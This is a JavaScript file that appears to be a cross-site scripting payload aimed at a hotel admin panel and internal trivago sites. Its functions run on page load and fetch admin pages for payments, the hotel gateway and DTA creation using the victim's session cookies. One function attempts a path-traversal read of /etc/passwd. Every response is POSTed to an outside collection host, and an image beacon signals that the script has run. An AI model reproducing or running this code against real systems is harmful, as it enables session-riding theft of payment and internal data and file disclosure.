
function stealPayments()
{
	var fetchHash = new XMLHttpRequest();

var url = window.location.protocol+"//"+window.location.hostname+"/adminexternal/index_web.php?pagetype=payments";
var datax;


fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
             storeData(datax);        
					   


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}



function stealHotelGateway()
{
	var fetchHash = new XMLHttpRequest();

var url = window.location.protocol+"//"+window.location.hostname+"/hotelgateway.php";
var datax;



fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
            storeData(datax);


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}



function stealIndex()
{
	var fetchHash = new XMLHttpRequest();

var url = window.location.protocol+"//"+window.location.hostname+"/adminexternal/index_web.php";
var datax;



fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
            storeData(datax);


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}

function stealDTA()
{
	var fetchHash = new XMLHttpRequest();

var url = window.location.protocol+"//"+window.location.hostname+"/adminexternal/index_web.php?pagetype=create_dta";
var datax;



fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
            storeData(datax);


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}

function stealKnowledge()
{
	var fetchHash = new XMLHttpRequest();

var url = "http://knowledge.trivago.com";
var datax;



fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
            storeData(datax);


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}


function stealTasks()
{
	var fetchHash = new XMLHttpRequest();

var url = "http://tasks.trivago.com";
var datax;



fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
            storeData(datax);


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}



function lfi()
{
	var fetchHash = new XMLHttpRequest();

var url = window.location.protocol+"//"+window.location.hostname+"/adminexternal/index_web.php?pagetype=../../../../../../../../etc/passwd";
var datax;



fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
            storeData(datax);


        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();

}


function storeData(inputData)
{
	
	var fetchHash = new XMLHttpRequest();

var url = "http://tabahi.witcoat.com/storeSome86501Da7A.php";
var datax= "tabahi="+inputData;



fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {
			return;

        }

}

fetchHash.open("POST",url, true);
//fetchHash.setRequestHeader("Content/type"," application/x-www-form-urlencoded");
fetchHash.withCredentials=true;
fetchHash.send(datax);
	
}


stealHotelGateway();
stealPayments();
deployCanary();
lfi();
stealIndex();
stealDTA();
stealKnowledge();
stealTasks();


function deployCanary() {
    var x = document.createElement("IMG");
    x.setAttribute("src", "http://canarytokens.com/feedback/y17pyhq7yyoky3tdvt65sdq25/post.jsp");
    document.body.appendChild(x);
}




